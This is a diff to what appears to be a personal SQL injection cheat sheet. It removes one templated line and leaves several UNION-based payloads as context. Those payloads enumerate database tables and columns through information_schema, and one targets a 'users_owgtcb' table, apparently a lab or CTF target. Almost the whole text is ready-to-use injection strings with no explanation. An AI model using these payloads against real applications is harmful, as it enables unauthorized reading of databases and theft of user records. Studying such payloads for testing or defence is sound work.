@@ -43,7 +43,6 @@ Pentestermonkey SQL injection cheat sheet: https://github.com/swisskyrepo/Payloa
 	1' union select 1, table_name FROM information_schema.tables-- -
 
 ### Columns
-	1' UNION SELECT null,[column_name] FROM [table_name]-- -
 	1' UNION SELECT null,column_name FROM information_schema.columns where table_name = 'users_owgtcb'-- -
 	1' union select 1,group_concat(column_name) from information_schema.tables where table_schema = database()-- -
 	id=1' union select 1, column_name FROM information_schema.tables-- -
